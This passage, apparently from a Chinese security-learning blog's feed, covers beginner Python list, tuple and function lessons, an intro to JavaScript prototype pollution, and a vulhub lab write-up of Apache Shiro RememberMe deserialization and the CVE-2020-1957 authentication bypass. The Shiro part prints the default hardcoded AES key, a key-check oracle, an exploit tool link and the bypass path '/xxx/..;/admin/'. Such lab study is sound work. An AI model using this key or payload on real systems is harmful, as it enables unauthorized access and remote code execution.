<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list.remove(<span class="string">&#x27;G&#x27;</span>)<span class="comment">#指定将G删除</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="built_in">print</span>(my_list.pop(<span class="number">1</span>))<span class="comment">#将第二位删除并显示出来</span></span><br><span class="line"><span class="built_in">print</span>(my_list)<span class="comment">#打印出来u</span></span><br><span class="line"><span class="built_in">print</span>(my_list.pop())<span class="comment">#没有提供索引，默认最后一位删除并显示</span></span><br><span class="line"><span class="built_in">print</span>(my_list)<span class="comment">#打印出来n</span></span><br><span class="line">my_list.clear()<span class="comment">#清空列表</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#u</span></span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#n</span></span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;f&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"><span class="comment">#[]</span></span><br></pre></td></tr></table></figure>

<h3 id="Python列表方法"><a href="#Python列表方法" class="headerlink" title="Python列表方法"></a>Python列表方法</h3><p>它们以list.method()方式访问。上面已经使用了某些方法。</p>
<table>
<thead>
<tr>
<th align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list.html">Python列表方法</a></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-append.html"><strong>append()</strong> -将元素添加到列表的末尾</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-extend.html"><strong>extend()</strong> -将列表的所有元素添加到另一个列表</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-insert.html"><strong>insert()</strong> -在定义的索引处插入一个项目</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-remove.html"><strong>remove()</strong> -从列表中删除一个项目</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-pop.html"><strong>pop()</strong> -删除并返回给定索引处的元素</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-clear.html"><strong>clear()</strong> -从列表中删除所有项目</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-index.html"><strong>index()</strong> -返回第一个匹配项的索引</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-count.html"><strong>count()</strong> -返回作为参数传递的项目数</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-sort.html"><strong>sort()</strong> -以升序对列表中的项目进行排序</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-reverse.html"><strong>reverse()</strong> -反转列表中项目的顺序</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-copy.html"><strong>copy()</strong> -返回列表的浅表副本</a></td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">6</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list.index(<span class="string">&#x27;n&#x27;</span>))<span class="comment">#显示索引</span></span><br><span class="line"><span class="built_in">print</span>(my_list.count(<span class="number">6</span>))<span class="comment">#计数</span></span><br><span class="line">second_list =[<span class="number">1</span>,<span class="number">23</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">13</span>]</span><br><span class="line">second_list.sort()<span class="comment">#升序排列</span></span><br><span class="line"><span class="built_in">print</span>(second_list)</span><br><span class="line">second_list.reverse()<span class="comment">#逆转</span></span><br><span class="line"><span class="built_in">print</span>(second_list)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#[1, 3, 13, 13, 23]</span></span><br><span class="line"><span class="comment">#[23, 13, 13, 3, 1]</span></span><br></pre></td></tr></table></figure>

<h3 id="列表理解：创建新列表的优雅方式"><a href="#列表理解：创建新列表的优雅方式" class="headerlink" title="列表理解：创建新列表的优雅方式"></a>列表理解：创建新列表的优雅方式</h3><p>列表理解是从Python现有列表中创建新列表的一种简洁明了的方法。</p>
<p>列表理解包含一个表达式，后跟方括号内的<a href="https://www.cainiaoplus.com/python/python-for-loop.html">for语句</a>。</p>
<p>这是一个列出每项增加2的幂的示例。</p>
<h2 id="Python-元组（Tuple）"><a href="#Python-元组（Tuple）" class="headerlink" title="Python 元组（Tuple）"></a>Python 元组（Tuple）</h2><h3 id="创建一个元组"><a href="#创建一个元组" class="headerlink" title="创建一个元组"></a>创建一个元组</h3><p>通过将所有项目（元素）放在括号内()（以逗号分隔）来创建元组。括号是可选的，但是，使用括号是一个好习惯。</p>
<p>元组可以具有任意数量的项，并且它们可以具有不同的类型（整数，浮点数，列表，<a href="https://www.cainiaoplus.com/python/python-string.html">字符串</a>等）。</p>
<p>也可以在不使用括号的情况下创建元组。这称为元组包装。</p>
<p>用一个元素创建一个元组有点特殊。</p>
<p><strong>只有一个元素的元组，括号内仅包含一个元素是不够的。我们将需要一个逗号结尾来表明它实际上是一个元组。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;Gu0f3n&quot;</span>)<span class="comment">#创建一个元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))<span class="comment">#打印元组内容</span></span><br><span class="line">my_tuple=(<span class="string">&quot;Gu0f3n&quot;</span>,)<span class="comment">#创建只有一个元素的元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))</span><br><span class="line">my_tuple=<span class="string">&quot;Guof3n&quot;</span>,<span class="comment">#不适用括号进行元组包装（括号可选）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="comment">#&lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"><span class="comment">#&lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="访问元组元素"><a href="#访问元组元素" class="headerlink" title="访问元组元素"></a>访问元组元素</h3><p>我们可以通过多种方式访问元组的元素。</p>
<p>1.索引</p>
<p>我们可以使用索引运算符[]访问索引从0开始的元组中的项目。</p>
<p>因此，具有6个元素的元组将具有从0到5的索引。尝试访问元组之外的元素（例如6、7 …）将引发IndexError。</p>
<p>索引必须是整数；因此我们不能使用float或其他类型。如果使用会导致TypeError。</p>
<p>同样，使用嵌套索引访问嵌套元组，如下面的示例所示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple =(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># IndexError:列表索引超出范围</span></span><br><span class="line"><span class="comment"># print(my_tuple[6])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 索引必须是整数</span></span><br><span class="line"><span class="comment"># TypeError: 列表索引必须是整数，而不是浮点数</span></span><br><span class="line"><span class="comment"># my_tuple[2.0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#嵌套元组</span></span><br><span class="line">n_tuple=(<span class="string">&quot;Guof3n&quot;</span>,[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>],(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(n_tuple[<span class="number">0</span>][<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(n_tuple[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<p>2.负索引</p>
<p>Python允许对其序列进行负索引。</p>
<p>索引-1表示最后一项，-2表示倒数第二项，依此类推。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;G&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;0&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">1</span>])<span class="comment">#n</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">5</span>])<span class="comment">#u</span></span><br></pre></td></tr></table></figure>

<p>3.切片</p>
<p>我们可以使用切片运算符-冒号“：”访问元组中的一系列项目。</p>
<p>和列表差不太多【）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;G&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">1</span>:<span class="number">5</span>])<span class="comment">#(&#x27;u&#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:<span class="number">2</span>])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:-<span class="number">7</span>])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">2</span>:])<span class="comment">#(&#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6)</span></span><br></pre></td></tr></table></figure>

<p>通过考虑索引位于元素之间，可以最好地可视化切片，如下所示。因此，如果要访问范围，则需要将元组中的部分切片的索引。</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732086569792.png"></p>
<p>后面一些类型像字典 元组和列表都大差不差 所以这章先到这里</p>
<h1 id="Python-pass-语句"><a href="#Python-pass-语句" class="headerlink" title="Python pass 语句"></a>Python pass 语句</h1><p>在本文中，您将学习pass语句。 它用作在后面实现函数，循环等的占位符。</p>
<h2 id="什么是Python中的pass语句？"><a href="#什么是Python中的pass语句？" class="headerlink" title="什么是Python中的pass语句？"></a>什么是Python中的pass语句？</h2><p>在Python编程中，pass语句为空语句。在Python中，<a href="https://www.cainiaoplus.com/python/python-statement-indentation-comments.html">注释</a>和pass语句之间的区别在于，尽管解释器完全忽略注释，而pass不会被忽略。</p>
<p>但是，执行传递时没有任何反应。结果为无操作（NOP）。</p>
<h3 id="pass语法"><a href="#pass语法" class="headerlink" title="pass语法"></a>pass语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure>

<p>我们通常将其用作占位符。</p>
<p>假设我们有一个尚未实现的<a href="https://www.cainiaoplus.com/python/python-for-loop.html">循环</a>或<a href="https://www.cainiaoplus.com/python/python-function.html">函数</a>，但我们想在将来执行实现它。他们不能有一个空的主体，解释器将给出错误。因此，我们使用该pass语句构造一个不执行任何操作的主体。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;pass只是一个占位符，</span><br><span class="line">用于以后添加功能。&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="Python-函数"><a href="#Python-函数" class="headerlink" title="Python 函数"></a>Python 函数</h1><p>在本文中，您将了解函数、函数是什么、函数的语法、构成和类型。另外，您还将学习如何用Python创建函数。</p>
<h2 id="Python中的函数是什么？"><a href="#Python中的函数是什么？" class="headerlink" title="Python中的函数是什么？"></a>Python中的函数是什么？</h2><p>在Python中，函数是一组执行特定任务的相关语句。</p>
<p>函数有助于将我们的程序分解为<strong>较小的模块</strong>。随着我们的项目越来越大，函数使其变得更加有组织和易于管理。</p>
<p>此外，它避免了重复写相同的代码，函数使代码可重复使用。</p>
<h3 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">function_name</span>(<span class="params">parameters</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;docstring&quot;&quot;&quot;</span></span><br><span class="line">	statement(s)</span><br></pre></td></tr></table></figure>

<p>上面显示的是由以下组件组成的函数定义。</p>
<ol>
<li>def标记函数头开始的关键字。</li>
<li>用于唯一标识函数的函数名称。函数命名遵循<a href="https://www.cainiaoplus.com/python/python-keywords-identifier.html#rules">在Python中编写标识符</a>的相同<a href="https://www.cainiaoplus.com/python/python-keywords-identifier.html#rules">规则</a>。</li>
<li>通过其将值传递给函数的参数。它们是可选的。</li>
<li>冒号（:)标记函数头的结尾。</li>
<li>可选的文档字符串（docstring），用于描述函数的函数。</li>
<li>组成函数体的一个或多个有效python语句。语句必须具有相同的缩进级别（通常为4个空格）。</li>
<li>可选的return语句，用于从函数返回值。</li>
</ol>
<h3 id="函数示例"><a href="#函数示例" class="headerlink" title="函数示例"></a>函数示例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    这是一个打招呼的函数，</span></span><br><span class="line"><span class="string">    通过name参数传递，</span></span><br><span class="line"><span class="string">    要打招呼的人名</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;. Good morning!&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="如何在python中调用函数？"><a href="#如何在python中调用函数？" class="headerlink" title="如何在python中调用函数？"></a>如何在python中调用函数？</h3><p>定义函数后，我们可以从另一个函数，程序甚至Python提示符中调用它。要调用函数，我们只需键入带有适当参数的函数名称即可。</p>
<h2 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句"></a>return 语句</h2><p>return语句用于退出函数并返回到调用函数的位置。</p>
<h3 id="回语法"><a href="#回语法" class="headerlink" title="回语法"></a>回语法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [expression_list]</span><br></pre></td></tr></table></figure>

<p>该语句可以包含一个表达式，该表达式将被求值并返回值。如果该语句中没有表达式，或者return语句本身不存在于函数中，则该函数将返回None对象。</p>
<p><strong>例如：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(greet(<span class="string">&quot;May&quot;</span>))</span><br><span class="line">Hello, May. Good morning!</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>None是返回值，因为greet()函数直接打印名称，并且没有使用return语句。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">absolute_value</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;这个函数返回输入数字的绝对值&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(absolute_value(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(absolute_value(-<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<h2 id="Function如何在Python中工作？"><a href="#Function如何在Python中工作？" class="headerlink" title="Function如何在Python中工作？"></a>Function如何在Python中工作？</h2><p><img src="https://www.cainiaoplus.com/run/images/python-how-function-works_1.jpg" alt="函数如何在Python中工作？"></p>
<h2 id="变量的作用域和生命周期"><a href="#变量的作用域和生命周期" class="headerlink" title="变量的作用域和生命周期"></a>变量的作用域和生命周期</h2><p>变量的作用域是程序中可以识别该变量的部分。从函数外部看不到在函数内部定义的参数和变量。因此，它们具有本地作用域。</p>
<p>变量的生命周期是变量在内存中退出的时间。函数内部变量的生命周期与函数执行的时间一样长。</p>
<p>一旦我们从函数返回，它们就会被销毁。因此，函数无法记住其先前调用中的变量值。</p>
<p>这是一个示例，用于说明函数内部变量的生命周期。</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def my_func():</span><br><span class="line">	x = 10</span><br><span class="line">	print(&quot;函数内部值:&quot;,x)</span><br><span class="line"></span><br><span class="line">x = 20</span><br><span class="line">my_func()</span><br><span class="line">print(&quot;函数外部值:&quot;,x)</span><br></pre></td></tr></table></figure>

<p><strong>输出结果</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数内部值: 10</span><br><span class="line">函数外部值: 20</span><br></pre></td></tr></table></figure>

<p>在这里，我们可以看到x的初始值为20。即使函数my_func()将x的值更改为10，它也不会影响函数外部的值。</p>
<p>这是因为函数内部的变量x与函数外部的x变量不同。尽管它们具有相同的名称，<strong>但是它们是两个具有不同作用域的不同变量</strong>。</p>
<p>另一方面，从外部可以看到函数外部的变量。它们具有全局作用域，也就是函数内外部都可以使用该全局变量。</p>
<p>我们可以从函数内部读取这些值，但不能更改（写入）它们。如果要在函数外部修改变量的值，必须使用关键字global，将它们声明为全局变量。</p>
<h2 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h2><p>基本上，我们可以将函数分为以下两种类型：</p>
<ol>
<li><a href="https://www.cainiaoplus.com/python/python-methods-built-in.html">内置函数-Python内置的函数</a>。</li>
<li><a href="https://www.cainiaoplus.com/python/python-user-defined-function.html">用户定义的函数</a> -用户自己<a href="https://www.cainiaoplus.com/python/python-user-defined-function.html">定义的函数</a>。</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>js原型链污染初探</title>
    <url>/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>Learn from:<a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a></p>
<p>先放一张图</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732502203084.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js 是由对象组成的，对象与对象之间存在着继承关系</span><br><span class="line"></span><br><span class="line">每个对象都有一个指向它的原型的内部链接，而这个原型对象又有他自己的原型，直到 null 为止</span><br><span class="line"></span><br><span class="line">整体看来就是多个对象层层继承，实例对象的原型链接形成了一条链，也就是 js 的原型链</span><br><span class="line"></span><br><span class="line">在 js 中每个函数都有一个 prototype 属性，而每个对象中也有一个 **proto** 属性用来指向实例对象的原型</span><br><span class="line"></span><br><span class="line">而每个原型也都有一个 constructor 属性执行相关联的构造函数，我们就是通过构造函数生成实例化的对象</span><br></pre></td></tr></table></figure>

<p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p>
<p>这幅图的原型链是 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</span><br></pre></td></tr></table></figure>

<p><strong>原型链污染通常出现在对象</strong>，<strong>数组的键名或者属性名可控</strong>，同时是赋值语句的情况下 ( 通常使用 json 传值 )</p>
<p>Learn form:<a href="https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p>
<p>师傅讲的很详细</p>
<p><strong>prototype和__proto__的区别</strong></p>
<p>在 JavaScript 中，每个对象都有一个 <code>__proto__</code> 属性，它指向该对象的原型。原型是一个对象，也可以有自己的原型，这样就形成了一个原型链。同时，每个函数也有一个 <code>prototype</code> 属性，它是一个对象，当该函数作为构造函数创建实例时，实例对象的 <code>__proto__</code> 属性会指向该构造函数的 <code>prototype</code> 属性，这样就可以实现属性和方法的继承。</p>
<p>区别在于：</p>
<ul>
<li><code>prototype</code>属性是函数所独有的，而<code>__proro__</code>属性是每个对象都有的（再强调一次，函数也是js对象）</li>
<li><code>prototype</code> 属性指向一个对象，它是用来存储属性和方法，这些属性和方法可以被该函数的实例对象所继承。而 <code>__proto__</code> 属性指向该对象的原型，它是用来实现对象之间的继承。简单来说就是<code>functionName.prototype===varName.__proto__</code>，都可以访问到对象的原型。</li>
</ul>
<h2 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h2><p><strong>概念</strong></p>
<p>一句话概括原型链污染：如果修改了一个对象的原型，那么会影响所有来自于这个原型的对象，这就是原型链污染。</p>
<p>原型链污染通常出现在对象，数组的键名或者属性名可控，同时是赋值语句的情况下 （简单来说就是键名和键值都可控情况下），将键名设置为<code>__proto__</code>就可以利用赋值语句修改原型对象，进而实现原型链污染，常见的危险函数有merge和clone。</p>
]]></content>
      <categories>
        <category>pollute</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro反序列化漏洞复现</title>
    <url>/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>vulhub靶场复现</p>
<p>漏洞原理</p>
<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p>
<p>这是一个典型的 <strong>Shiro RememberMe 反序列化漏洞</strong>的触发路径。用大白话解释就是：</p>
<hr>
<h3 id="场景比喻"><a href="#场景比喻" class="headerlink" title="场景比喻"></a><strong>场景比喻</strong></h3><p>想象你进了一家高级会所，前台给你一张<strong>加密的会员卡（RememberMe Cookie）</strong>，下次来不用输密码，直接刷卡进。但这家会所的会员卡加密方式有问题——<strong>用的是一把通用钥匙（默认密钥）</strong>，导致坏人能伪造任意会员卡。</p>
<hr>
<h3 id="流程拆解"><a href="#流程拆解" class="headerlink" title="流程拆解"></a><strong>流程拆解</strong></h3><ol>
<li><strong>登录成功</strong>：<br>你输入账号密码正确，前台（Shiro）说：“记住这个用户，下次直接刷会员卡进！”<br>→ 触发 <code>onSuccessfulLogin</code> 方法。</li>
<li><strong>制作会员卡</strong>：<br>前台把你的信息（用户名、权限）​<strong>打包成快递（序列化）​</strong>，用<strong>会所统一包装盒（加密）​</strong>封好，再贴个快递单（Base64编码）。<br>→ 调用 <code>rememberIdentity</code> → <code>rememberSerializedIdentity</code>。</li>
<li><strong>快递配送</strong>：<br>前台把包装好的快递（加密后的数据）塞进你的浏览器，变成一张<strong>会员卡（Cookie）​</strong>。<br>→ 设置Cookie值 <code>rememberMe=加密后的Base64字符串</code>。</li>
<li><strong>漏洞在哪</strong>：<ul>
<li><strong>通用钥匙</strong>：所有会员卡都用同一把钥匙加密（Shiro默认硬编码密钥）。</li>
<li><strong>包装盒可破解</strong>：序列化数据用的是可预测的加密方式（AES-CBC）。<br>→ 坏人拿到你的会员卡，拆开包装盒，换上自己的毒包裹（恶意代码），再用原样封好，系统会正常解密执行。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.首先正常登录，然后生成带有rememberme的返回cookie值。 2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager 3.之后进入serialize，对登录认证信息进行序列化 4.然后加密，调用aes算法。 5.加密结束，然后在在org/apache/shiro/web/mgt/CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回 6.解析cookie 7.先解密在反序列化 8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码 9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public AbstractRememberMeManager这里用的是默认反序列化类,然后触发生成反序列化</span><br></pre></td></tr></table></figure>

<p>生成带有Rememberme的返回cookie-&gt;处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager-&gt;序列化登录信息-&gt;交给aes进行加密-&gt;加密后org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.java的rememberSerializedIdentity进行base64编码-&gt;解析cookie-&gt;先解密在反序列化</p>
<p>判断AES密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥不正确或类型转换异常时，目标Response包含Set-Cookie：rememberMe=deleteMe字段，</span><br><span class="line"></span><br><span class="line">而当密钥正确且没有类型转换异常时，返回包不存在Set-Cookie：rememberMe=deleteMe字段</span><br></pre></td></tr></table></figure>

<p>工具：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases</a></p>
<p>shrio-550使用的是默认密钥kPH+blxk5D2deZilxcaaaA&#x3D;&#x3D;</p>
<p>工具非常给力可以获得密钥</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741351728827.jpg"></p>
<p>这就不去复现了</p>
<h1 id="Shiro-认证绕过漏洞-CVE-2020-1957"><a href="#Shiro-认证绕过漏洞-CVE-2020-1957" class="headerlink" title="[Shiro-认证绕过漏洞(CVE-2020-1957)]"></a>[Shiro-认证绕过漏洞(CVE-2020-1957)]</h1><p>核心点就是</p>
<ol>
<li><p><strong>场景设定</strong>：</p>
<ul>
<li><strong>门卫（Shiro）</strong>：负责检查每个客人能不能进VIP室，规则是”所有想进 <code>/vip</code> 房间的人必须出示会员卡”。</li>
<li><strong>管家（Spring）</strong>：负责带客人去实际房间，但它有个怪癖——<strong>看到分号 <code>;</code> 就会自动截断</strong>后面的内容。</li>
</ul>
</li>
<li><p><strong>坏人如何混进VIP室</strong>：<br>坏人不去正门 <code>/vip</code>，而是故意走歪路：</p>
<ul>
<li><strong>构造假路径</strong>：<code>/vip;/../秘密通道</code></li>
<li><strong>门卫视角</strong>：检查路径是 <code>/vip</code>（因为Shiro看到分号 <code>;</code> 就停下），发现规则是允许所有人访问 <code>/vip</code>（未配置需要登录），直接放行。</li>
<li><strong>管家视角</strong>：处理路径时，看到分号 <code>;</code> 就截断成 <code>/vip</code>，实际却把客人带到 <code>/秘密通道</code>（VIP室后门）。</li>
</ul>
<p>→ <strong>门卫以为你去的是公开区域，管家却把你带进了VIP室</strong>，全程没查会员卡！</p>
</li>
</ol>
<p>这个文章写的也很好<a href="https://www.cnblogs.com/dhan/p/18423713">https://www.cnblogs.com/dhan/p/18423713</a></p>
<p>这个文章主流payload是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx/..;/admin/</span><br></pre></td></tr></table></figure>

<p>首先shiro处理的</p>
<p>将分号后面的内容直接处理了得到xxx&#x2F;..，显示不是要去&#x2F;admin可以直接bypass掉了shiro认证</p>
<p>spring认证</p>
<p>跟进removeSemicolonContentInternal(requestUri)方法，他的作用就是：<code>移除uri中/与/之间的;分号以及;分号后面的内容</code></p>
<p>根据这句话可以得知最后的uri应该是：</p>
<p><code>/xxx/../admin/ == /admin/</code></p>
]]></content>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>java study</title>
    <url>/2024/09/04/study/</url>
